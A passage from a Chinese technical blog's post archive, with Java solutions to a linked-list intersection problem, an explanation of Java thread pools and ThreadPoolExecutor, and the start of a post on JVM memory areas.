<span class="keyword">while</span> (<span class="keyword">null</span> != headB) &#123;</span><br><span class="line">			<span class="keyword">if</span> (set.contains(headB)) &#123;</span><br><span class="line">				<span class="keyword">return</span> headB;</span><br><span class="line">			&#125;</span><br><span class="line">			headB = headB.next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：构造环形链表"><a href="#解法二：构造环形链表" class="headerlink" title="解法二：构造环形链表"></a>解法二：构造环形链表</h3><p>把其中一个链表的头尾相连，对另一个链表采用快慢指针。如果这两个链表相交，两个快慢指针一定能够相遇，之后再采用Floyd算法，找到相交点。否则其中任意一个指针到达null，说明不存在相交的情况。</p>
<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>观察上图例子可知，两个链表长度不相等，并且相交，那么，在交点之前的长度差就是abs(l1.length - l2.length)和两个完整的链表长度差是一致的。因为从交点之后两个链表的长度就一致了。</p>
<p>那么，就可以先遍历2次分别求出两个链表的长度，记为l1，l2.</p>
<p>使用两个指针，p1，p2.p1指向l1的首部，p2指向l2的首部。如果l1 &gt; l2的话，p1先前移(l1-l2)个节点，然后p1，p2同时一步一步移动。</p>
<p>如果期间两个指针指向的链表节点相等（非null），则该节点就是交点，否则，不存在交点。</p>
<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>同时遍历链表A和B，如果A到达链表尾，赋值B链表的头，继续遍历。B到达链表尾赋值A的头，继续遍历。无论相交与否，两者都会在null或者相交的交点处相遇。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        ListNode a = headA;</span><br><span class="line">        ListNode b = headB;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == a || <span class="keyword">null</span> == b) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (a != b) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (<span class="keyword">null</span> == a) &#123;</span><br><span class="line">        		a = headB;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		a = a.next;</span><br><span class="line">        	&#125;</span><br><span class="line">        	</span><br><span class="line">        	<span class="keyword">if</span> (<span class="keyword">null</span> == b) &#123;</span><br><span class="line">        		b = headA;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		b = b.next;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-线程池</title>
    <url>/2020/03/28/Java/Java%E5%9F%BA%E7%A1%80/2020-03-29-Java-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java中的线程池"><a href="#Java中的线程池" class="headerlink" title="Java中的线程池"></a>Java中的线程池</h1><p>线程池是一个管理线程的池子，它的作用有以下几点：</p>
<ul>
<li>管理线程，避免增加创建线程和销毁线程的资源损耗</li>
<li>提高响应速度</li>
<li>重复利用</li>
</ul>
<h2 id="创建线程池"><a href="#创建线程池" class="headerlink" title="创建线程池"></a>创建线程池</h2><p>常见的创建线程池的方式有以下几种：</p>
<h3 id="Executors-newCachedThreadPool"><a href="#Executors-newCachedThreadPool" class="headerlink" title="Executors.newCachedThreadPool()"></a>Executors.newCachedThreadPool()</h3><ul>
<li>核心线程数为0</li>
<li>最大线程数为Integer.MAX_VALUE</li>
<li>阻塞队列是SynchronousQueue</li>
<li>非核心线程空闲存活时间为60s</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a thread pool that creates new threads as needed, but</span></span><br><span class="line"><span class="comment">     * will reuse previously constructed threads when they are</span></span><br><span class="line"><span class="comment">     * available.  These pools will typically improve the performance</span></span><br><span class="line"><span class="comment">     * of programs that execute many short-lived asynchronous tasks.</span></span><br><span class="line"><span class="comment">     * Calls to &#123;<span class="doctag">@code</span> execute&#125; will reuse previously constructed</span></span><br><span class="line"><span class="comment">     * threads if available. If no existing thread is available, a new</span></span><br><span class="line"><span class="comment">     * thread will be created and added to the pool. Threads that have</span></span><br><span class="line"><span class="comment">     * not been used for sixty seconds are terminated and removed from</span></span><br><span class="line"><span class="comment">     * the cache. Thus, a pool that remains idle for long enough will</span></span><br><span class="line"><span class="comment">     * not consume any resources. Note that pools with similar</span></span><br><span class="line"><span class="comment">     * properties but different details (for example, timeout parameters)</span></span><br><span class="line"><span class="comment">     * may be created using &#123;<span class="doctag">@link</span> ThreadPoolExecutor&#125; constructors.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the newly created thread pool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                      <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                      <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当提交任务的速度大于处理任务的速度时，每次提交一个任务，就必然会创建一个线程。极端情况下会创建过多的线程，耗尽CPU和内存资源。由于空闲60秒的线程会被终止，长时间保持空闲的CachedThreadPool不会占用任何资源</p>
<p>它的工作步骤是：</p>
<ol>
<li>提交任务</li>
<li>判断是否有核心线程，没有的话，任务加载到SynchronousQueue队列</li>
<li>有的话，判断是否有空闲线程，如果有，就取出任务执行</li>
<li>如果没有空闲线程，就新建一个线程执行</li>
<li>执行完任务的线程，还可以存活60秒，如果在这期间，接到任务，可以继续存活下去，否则，被销毁</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-07-cached-thread-pool.png" alt="CachedThreadPool工作原理"></p>
<h3 id="Executors-newFixedThreadPool"><a href="#Executors-newFixedThreadPool" class="headerlink" title="Executors.newFixedThreadPool()"></a>Executors.newFixedThreadPool()</h3><ul>
<li>核心数和最大线程数大小一样</li>
<li>没有所谓的非空闲时间，即keepAliveTime为0</li>
<li>阻塞队列为无界队列LinkedBlockingQueue</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a thread pool that reuses a fixed number of threads</span></span><br><span class="line"><span class="comment">     * operating off a shared unbounded queue, using the provided</span></span><br><span class="line"><span class="comment">     * ThreadFactory to create new threads when needed.  At any point,</span></span><br><span class="line"><span class="comment">     * at most &#123;<span class="doctag">@code</span> nThreads&#125; threads will be active processing</span></span><br><span class="line"><span class="comment">     * tasks.  If additional tasks are submitted when all threads are</span></span><br><span class="line"><span class="comment">     * active, they will wait in the queue until a thread is</span></span><br><span class="line"><span class="comment">     * available.  If any thread terminates due to a failure during</span></span><br><span class="line"><span class="comment">     * execution prior to shutdown, a new one will take its place if</span></span><br><span class="line"><span class="comment">     * needed to execute subsequent tasks.  The threads in the pool will</span></span><br><span class="line"><span class="comment">     * exist until it is explicitly &#123;<span class="doctag">@link</span> ExecutorService#shutdown</span></span><br><span class="line"><span class="comment">     * shutdown&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nThreads the number of threads in the pool</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> threadFactory the factory to use when creating new threads</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the newly created thread pool</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NullPointerException if threadFactory is null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if &#123;<span class="doctag">@code</span> nThreads &lt;= 0&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads, ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">                                      <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                      <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;(),</span><br><span class="line">                                      threadFactory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它的工作步骤是：</p>
<ol>
<li>提交任务</li>
<li>如果线程数少于核心线程，创建核心线程执行任务</li>
<li>如果线程数等于核心线程，把任务添加到LinkedBlockingQueue阻塞队列</li>
<li>如果线程执行完任务，去阻塞队列取任务，继续执行</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-07-fixed-thread-pool.png" alt="固定线程数线程池工作步骤"></p>
<p><strong>使用无界队列的线程池会导致内存飙升</strong></p>
<h3 id="Executors-newScheduledThreadPool"><a href="#Executors-newScheduledThreadPool" class="headerlink" title="Executors.newScheduledThreadPool()"></a>Executors.newScheduledThreadPool()</h3><ul>
<li>最大线程数为Integer.MAX_VALUE</li>
<li>阻塞队列是DelayedWordQueue</li>
<li>keepAliveTime为0</li>
<li>scheduleAtFixedRate() ：按某种速率周期执行</li>
<li>scheduleWithFixedDelay()：在某个延迟后执行</li>
</ul>
<p>它的工作步骤是：</p>
<ol>
<li>添加一个任务</li>
<li>线程池中的线程从 DelayQueue 中取任务</li>
<li>线程从 DelayQueue 中获取 time 大于等于当前时间的task</li>
<li>执行完后修改这个 task 的 time 为下次被执行的时间</li>
<li>这个 task 放回DelayQueue队列中</li>
</ol>
<h3 id="Executors-newSingleThreadPool"><a href="#Executors-newSingleThreadPool" class="headerlink" title="Executors.newSingleThreadPool()"></a>Executors.newSingleThreadPool()</h3><ul>
<li>核心线程数为1</li>
<li>最大线程数也为1</li>
<li>阻塞队列是LinkedBlockingQueue</li>
<li>keepAliveTime为0</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates an Executor that uses a single worker thread operating</span></span><br><span class="line"><span class="comment">     * off an unbounded queue. (Note however that if this single</span></span><br><span class="line"><span class="comment">     * thread terminates due to a failure during execution prior to</span></span><br><span class="line"><span class="comment">     * shutdown, a new one will take its place if needed to execute</span></span><br><span class="line"><span class="comment">     * subsequent tasks.)  Tasks are guaranteed to execute</span></span><br><span class="line"><span class="comment">     * sequentially, and no more than one task will be active at any</span></span><br><span class="line"><span class="comment">     * given time. Unlike the otherwise equivalent</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> newFixedThreadPool(1)&#125; the returned executor is</span></span><br><span class="line"><span class="comment">     * guaranteed not to be reconfigurable to use additional threads.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the newly created single-threaded Executor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newSingleThreadExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FinalizableDelegatedExecutorService</span><br><span class="line">            (<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                    <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它的工作步骤是：</p>
<ol>
<li>提交任务</li>
<li>线程池是否有一条线程在，如果没有，新建线程执行任务</li>
<li>如果有，将任务加载到阻塞队列</li>
<li>从队列取任务，执行完一个继续执行下一个</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-07-single-thread-pool.png" alt="SingleThreadPool工作流程"></p>
<h3 id="线程池主要参数"><a href="#线程池主要参数" class="headerlink" title="线程池主要参数"></a>线程池主要参数</h3><p>跟踪这几个创建线程池的源码就会发现，它们其实都是通过ThreadPoolExecutor类实现的。我们看下它的构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a new &#123;<span class="doctag">@code</span> ThreadPoolExecutor&#125; with the given initial</span></span><br><span class="line"><span class="comment">     * parameters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> corePoolSize the number of threads to keep in the pool, even</span></span><br><span class="line"><span class="comment">     *        if they are idle, unless &#123;<span class="doctag">@code</span> allowCoreThreadTimeOut&#125; is set</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> maximumPoolSize the maximum number of threads to allow in the</span></span><br><span class="line"><span class="comment">     *        pool</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> keepAliveTime when the number of threads is greater than</span></span><br><span class="line"><span class="comment">     *        the core, this is the maximum time that excess idle threads</span></span><br><span class="line"><span class="comment">     *        will wait for new tasks before terminating.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> unit the time unit for the &#123;<span class="doctag">@code</span> keepAliveTime&#125; argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> workQueue the queue to use for holding tasks before they are</span></span><br><span class="line"><span class="comment">     *        executed.  This queue will hold only the &#123;<span class="doctag">@code</span> Runnable&#125;</span></span><br><span class="line"><span class="comment">     *        tasks submitted by the &#123;<span class="doctag">@code</span> execute&#125; method.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> threadFactory the factory to use when the executor</span></span><br><span class="line"><span class="comment">     *        creates a new thread</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler the handler to use when execution is blocked</span></span><br><span class="line"><span class="comment">     *        because the thread bounds and queue capacities are reached</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if one of the following holds:&lt;br&gt;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> corePoolSize &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> keepAliveTime &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt;= 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt; corePoolSize&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NullPointerException if &#123;<span class="doctag">@code</span> workQueue&#125;</span></span><br><span class="line"><span class="comment">     *         or &#123;<span class="doctag">@code</span> threadFactory&#125; or &#123;<span class="doctag">@code</span> handler&#125; is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                              TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                              BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                              ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                              RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">            keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        <span class="keyword">if</span> (workQueue == <span class="keyword">null</span> || threadFactory == <span class="keyword">null</span> || handler == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="keyword">this</span>.acc = System.getSecurityManager() == <span class="keyword">null</span> ?</span><br><span class="line">                <span class="keyword">null</span> :</span><br><span class="line">                AccessController.getContext();</span><br><span class="line">        <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">        <span class="keyword">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">        <span class="keyword">this</span>.workQueue = workQueue;</span><br><span class="line">        <span class="keyword">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">        <span class="keyword">this</span>.threadFactory = threadFactory;</span><br><span class="line">        <span class="keyword">this</span>.handler = handler;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>线程池就是上面几个核心参数：</p>
<h4 id="corePoolSize"><a href="#corePoolSize" class="headerlink" title="corePoolSize"></a>corePoolSize</h4><p>核心线程数目。默认情况下，在创建了线程之后，线程池中的线程数为0，当有任务来之后，就会创建一个线程去执行任务，当线程池中的线程数目达到corePoolSize后，就会把到达的任务放进缓存队列中</p>
<h4 id="maximumPoolSize"><a href="#maximumPoolSize" class="headerlink" title="maximumPoolSize"></a>maximumPoolSize</h4><p>线程池最大的线程数。表示线程最多能创建多少个线程</p>
<h4 id="keepAliveTime"><a href="#keepAliveTime" class="headerlink" title="keepAliveTime"></a>keepAliveTime</h4><p>表示线程没有任务执行时最多保持多久时间会终止。默认情况下，只有</p>
<h4 id="unit"><a href="#unit" class="headerlink" title="unit"></a>unit</h4><p>参数keepAliveTime的时间单位，有7种取值</p>
<ul>
<li>TimeUnit.DAYS</li>
<li>TimeUnit.HOURS</li>
<li>TimeUnit.MINUTES</li>
<li>TimeUnit.SECONDS</li>
<li>TimeUnit.MILLISECONDS</li>
<li>TimeUnit.MICROSECONDS</li>
<li>TimeUnit.NANOSECONDS</li>
</ul>
<h4 id="workQueue"><a href="#workQueue" class="headerlink" title="workQueue"></a>workQueue</h4><p>一个阻塞队列，用来存储等待执行的任务。一般来说有以下几种队列：</p>
<ul>
<li>ArrayBlockingQueue：ArrayBlockingQueue（有界队列）是一个用数组实现的有界阻塞队列，按FIFO排序量。</li>
<li>LinkedBlockingQueue：基于链表结构的阻塞队列，按照FIFO排序任务，容量可以选择进行设置，不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE，吞吐量通常要高于ArrayBlockingQueue；newFixedThreadPool线程池使用了这个队列</li>
<li>DelayQueue：延迟队列，是一个任务定时周期的延迟执行的队列。根据指定的执行时间从小到大排序，否则根据插入到队列的先后排序。newScheduledThreadPool线程池使用了这个队列</li>
<li>PriorityBlockingQueue：是具有优先级的无界阻塞队列</li>
<li>SynchronousQueue：是一个不存储元素的阻塞队列，每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于LinkedBlockingQueue，newCachedThreadPool线程池使用了这个队列</li>
</ul>
<h4 id="threadFactory"><a href="#threadFactory" class="headerlink" title="threadFactory"></a>threadFactory</h4><p>线程工厂，主要用来创建线程</p>
<h4 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h4><p>表示当拒绝处理任务时的策略，有以下四种取值</p>
<ul>
<li>ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常</li>
<li>ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。 </li>
<li>ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）</li>
<li>ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务 </li>
</ul>
<h2 id="线程池状态"><a href="#线程池状态" class="headerlink" title="线程池状态"></a>线程池状态</h2><p>线程池有RUNNING、SHUTDOWN、STOP、TIDYING、TERMINATED等5个状态。</p>
<h3 id="RUNNING"><a href="#RUNNING" class="headerlink" title="RUNNING"></a>RUNNING</h3><p>在这个状态下的线程池可以接收新任务，并处理阻塞队列中的任务，此时调用线程池的shutdown()方法，可以切换到SHUTDOWN状态，调用shutdownNow()方法，可以切换到stop状态</p>
<h3 id="SHUTDOWN"><a href="#SHUTDOWN" class="headerlink" title="SHUTDOWN"></a>SHUTDOWN</h3><p>该状态的线程池不会接收新任务，但会处理阻塞队列中的任务。当队列为空时，并且线程池中执行的任务也为空，线程池就会进入TIDYING状态</p>
<h3 id="STOP"><a href="#STOP" class="headerlink" title="STOP"></a>STOP</h3><p>该状态的线程不会接收新任务，也不会处理阻塞队列中的任务，而且会中断正在运行的任务</p>
<h3 id="TIDYING"><a href="#TIDYING" class="headerlink" title="TIDYING"></a>TIDYING</h3><p>该状态表名所有的任务已经运行终止，记录的任务数量为0</p>
<h3 id="TERMINATED"><a href="#TERMINATED" class="headerlink" title="TERMINATED"></a>TERMINATED</h3><p>该状态表示线程池彻底终止</p>
<p>线程池各个状态的切换关系如下图所示</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-thread-pool-status.png" alt="线程池状态切换示意图"></p>
<h2 id="线程池的执行流程"><a href="#线程池的执行流程" class="headerlink" title="线程池的执行流程"></a>线程池的执行流程</h2><p>总的来说，线程池执行步骤可以用下图来概括：</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-thread-pool-run.png" alt="线程池的执行过程"></p>
<ol>
<li>提交一个任务，线程池里存活的核心线程数小于线程数corePoolSize时，线程池会创建一个核心线程去处理提交的任务</li>
<li>如果线程池核心线程数已满，即线程数已经等于corePoolSize，一个新提交的任务，会被放进任务队列workQueue排队等待执行</li>
<li>当线程池里面存活的线程数已经等于corePoolSize了，并且任务队列workQueue也满，判断线程数是否达到maximumPoolSize，即最大线程数是否已满，如果没到达，创建一个非核心线程执行提交的任务</li>
<li>如果当前线程数达到了maximumPoolSize，还有新的任务过来的话，直接采用拒绝策略处理。</li>
</ol>
<p>Java中的线程池是用ThreadPoolExecutor类来实现的. 本文就结合JDK 1.8对该类的源码来分析一下这个类内部对于线程的创建, 管理以及后台任务的调度等方面的执行原理。</p>
<p>先来看下线程池的类图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-thread-pool-class-diagram.png" alt="线程池类图"></p>
<p>Executors提供了一系列工厂方法用于创建线程池，返回的线程池都实现了ExecutorService接口。而后调用ExecutorService的execute(Runnable runnable)方法。一旦 Runnable 任务传递到 execute()方法，该方法便会自动在一个线程上执行。</p>
<h2 id="线程池异常处理"><a href="#线程池异常处理" class="headerlink" title="线程池异常处理"></a>线程池异常处理</h2><p>在使用线程池处理任务的时候，任务代码可能抛出RuntimeException，抛出异常后，线程池可能捕获它，也可能创建一个新的线程来代替异常的线程，我们可能无法感知任务出现了异常，因此我们需要考虑线程池异常情况。</p>
<p>有四种处理线程池异常的方法：</p>
<ol>
<li>使用try-catch捕获异常</li>
<li>submit执行，Future.get接受异常</li>
<li>重写ThreadPoolExecutor.afterExecute方法，处理传递的异常引用</li>
<li>实例化时，传入自己的ThreadFactory，设置Thread.UncaughtExceptionHandler处理未检测的异常</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-07-thread-pool-handle-exception.png" alt="线程池处理异常的方法"></p>
<h2 id="如何合理设置线程池大小"><a href="#如何合理设置线程池大小" class="headerlink" title="如何合理设置线程池大小"></a>如何合理设置线程池大小</h2><p>对于不同性质的任务来说，CPU密集型任务应配置尽可能小的线程，如配置CPU个数+1的线程数，IO密集型任务应配置尽可能多的线程，因为IO操作不占用CPU，不要让CPU闲下来，应加大线程数量，如配置两倍CPU个数+1，而对于混合型的任务，如果可以拆分，拆分成IO密集型和CPU密集型分别处理，前提是两者运行的时间是差不多的，如果处理时间相差很大，则没必要拆分了。</p>
<p>若任务对其他系统资源有依赖，如某个任务依赖数据库的连接返回的结果，这时候等待的时间越长，则CPU空闲的时间越长，那么线程数量应设置得越大，才能更好的利用CPU。</p>
<blockquote>
<p>最佳线程数目 = （（线程等待时间+线程CPU时间）/线程CPU时间 ）* CPU数目</p>
</blockquote>
<p>比如平均每个线程CPU运行时间为0.5s，而线程等待时间（非CPU运行时间，比如IO）为1.5s，CPU核心数为8，那么根据上面这个公式估算得到：((0.5+1.5)/0.5)*8=32。这个公式进一步转化为：</p>
<blockquote>
<p>最佳线程数目 = （线程等待时间与线程CPU时间之比 + 1）* CPU数目</p>
</blockquote>
<p>可以得出一个结论：</p>
<p><strong>线程等待时间所占比例越高，需要越多线程。线程CPU时间所占比例越高，需要越少线程。</strong></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://juejin.im/entry/58fada5d570c350058d3aaad" target="_blank" rel="noopener">深入理解 Java 线程池：ThreadPoolExecutor</a></p>
<p><a href="https://juejin.im/post/5d1882b1f265da1ba84aa676" target="_blank" rel="noopener">面试必备：Java线程池解析</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>线程</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存区域详解</title>
    <url>/2020/03/28/Java/JVM/2020-03-28-Java-%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="Java内存区域"><a href="#Java内存区域" class="headerlink" title="Java内存区域"></a>Java内存区域</h1><p>根据《Java虚拟机规范》规定，Java虚拟机，即JVM所管理的内容将会包括以下几个运行时数据区域。</p>
<p><img src="https://huhansi.github.io/images/2020-03-28-jvm1.jpg" alt="Java内存区域划分"></p>
<p>主要划分为五大块：<strong>程序计数器</strong>、<strong>虚拟机栈</strong>、<strong>本地方法栈</strong>、<strong>方法区</strong>和<strong>堆</strong>。</p>
<p>其中，程序计数器、虚拟机栈和本地方法栈是线程私有的，方法区和堆是共享数据。如下图：</p>
<p><img src="https://huhansi.github.io/images/2020-03-28-jvm2.jpg" alt="按照线程公私有划分"></p>
<p>接下来我们挨个看看这五块数据区域主要用来做什么。</p>
<h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>程序计数器（Program Counter Register）是一块较小的内存空间，它可以看做是当前线程所执行的字节码的行号指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取吓一跳需要执行的字节码指令，它是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器完成。</p>
<p>由于Java虚拟机的多线程是通过线程轮流切换、分配处理器执行时间的方式来实现的，在任何一个确定的时刻，一个处理器都只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器。</p>
<p>如果线程正在执行一个Java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是本地（Native）方法，这个计数器值则应为空。另外，此内存区域是唯一一个在《Java虚拟机规范》中没有规定任何OutOfMemoryError情况的区域。</p>
<p>总结一下就是：</p>
<ol>
<li>当前线程所执行的字节码行号指示器</li>
<li>每个线程都有各自的程序计数器</li>
<li>线程执行Java方法时，保存的是虚拟机字节码指令的地址</li>
<li>线程执行本地方法时，值为空</li>
<li>唯一在 <code>Java</code>虚拟机规范中没有规定任何 <code>OutOfMemoryError</code>情况区域。</li>
</ol>
<h2 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h2><p>虚拟机栈描述的是Java方法执行的线程内存模型：每个方法被执行的时候，Java虚拟机都会同步创建一个栈帧（Stack Frame）用于存储局部变量表、操作数栈、动态连接和方法出口等信息。每一个方法被调用直至执行完毕的过程，都对应着各一个栈帧在虚拟机栈中从入栈到出栈的过程。</p>
<p><img src="https://huhansi.github.io/images/2020-04-06-zhanzheng.jpg" alt="栈帧的概念结构"></p>
<h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><h4 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h4><p>局部变量表是一组变量值的存储空间，用于存放方法参数和方法内部定义的局部变量。在Java程序被编译为Class文件时，就在方法的Code属性的max_locals数据项中确定了该方法所需分配的局部变脸表的最大容量。</p>
<p>局部变量表的容量以变量槽为最小单位，《Java虚拟机规范》中并没有明确指出一个变量槽应占用的内存空间大小，只是很有导向性的说到每个变量槽都应该能存放一个boolean、byte、char、short、int、float、reference或returnAddress类型的数据。</p>
<p>对于64位的数据类型（long或者double），Java虚拟机会以高位对其的方式为其分派两个连续的变量槽空间。</p>
